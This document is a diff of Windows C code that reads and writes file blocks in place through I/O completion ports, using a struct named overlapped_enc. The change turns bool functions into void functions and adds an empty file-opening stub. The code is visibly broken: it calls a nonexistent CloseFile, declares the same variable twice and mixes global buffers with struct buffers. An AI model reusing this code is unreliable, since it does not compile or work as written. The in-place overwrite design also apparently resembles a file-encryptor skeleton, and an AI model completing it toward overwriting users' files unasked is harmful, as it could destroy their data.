@@ -15,7 +15,14 @@ return 0;
 }
 return 1;
 }
-bool block_read(overlapped_enc *ovl)
+void associate_file(char *filename)
+{
+HANDLE file = CreateFileA(filename,GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
+      
+
+
+}
+void block_read(overlapped_enc *ovl)
 {
 LARGE_INTEGER li;
 li.QuadPart = (ovl->current_block * BLOCK_SIZE);
@@ -24,9 +31,9 @@ ovl->overlapped.OffsetHigh = li.HighPart;
       BOOL res = ReadFile(ovl->file,inpbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
 ovl->operation = WRITE;
       PostQueuedCompletionStatus(CompletionPort,0,0, (LPOVERLAPPED)ovl);
-      return 0;
+      return ;
 }
-bool block_write(overlapped_enc *ovl)
+void block_write(overlapped_enc *ovl)
 {     
     memcpy(ovl->inpbuff,ovl->outbuff,BLOCK_SIZE);
     BOOL res = WriteFile(ovl->file,outbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
@@ -43,12 +50,12 @@ ovl->operation = READ;
 }
   
   PostQueuedCompletionStatus(CompletionPort, 0, 0, (LPOVERLAPPED)ovl);
- return 0;
+ return ;
 
 
 
 }
-bool handle_eof(overlapped_enc *ovl)
+void handle_eof(overlapped_enc *ovl)
 {
       memset(ovl->tempbuff,0,BLOCK_SIZE);
 BOOL res = ReadFile(ovl-> file,tempbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
@@ -56,12 +63,14 @@ BOOL res = ReadFile(ovl-> file,tempbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
 BOOL res = WriteFile(ovl->file,tempbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
 ovl->operation = CLOSE_IO;
   PostQueuedCompletionStatus(CompletionPort,0,0,(LPOVERLAPPED)ovl);
+      return;
 }
 void close_io(overlapped_enc *ovl)
 {
 CancelIo(ovl->file);
 CloseFile(ovl->file);
       free(ovl);
+      return;
 
 
 }
